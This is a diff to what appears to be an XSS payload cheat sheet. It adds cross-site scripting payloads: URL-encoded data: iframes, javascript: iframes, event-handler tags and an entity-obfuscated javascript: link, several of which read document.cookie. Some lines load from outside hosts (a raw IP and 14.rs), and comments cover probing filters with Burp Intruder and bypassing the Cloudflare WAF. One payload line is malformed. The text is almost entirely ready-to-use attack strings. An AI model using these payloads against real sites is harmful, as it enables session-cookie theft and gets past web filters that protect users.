@@ -1,10 +1,18 @@
 <embed src=//165.232.154.124>
-<iFrame/Src/Onerror=(alert)(1)>
-<a href=javascript:print()></a>
+<base src=//14.rs/#alert('XSSTEST')>
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%20%41%74%74%61%63%6b%21%27%29%3c%2f%73%63%72%69%70%74%3E"></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+
+
+
 <svg/onload=confirm(1)>
-# blacklisted(almost) (Intruder -> know which is possible)
+# blacklisted(almost) (Intruder -> know which is possible -> custom tag)
 <audio onplay=alert(1) autoplay>
+<details ontoggle= open>test</detail>
 <custom id=x onfocus=alert(document.cookie) tabindex=1>
 # whitelisted
 # bypass WAF (cloudflare)
 <Img/Src/OnError=(alert)(1)>
+
+# low impact
+<a/href="j&#97v&#97script&#x3A;&#97lert(document.cookie)">ClickMe
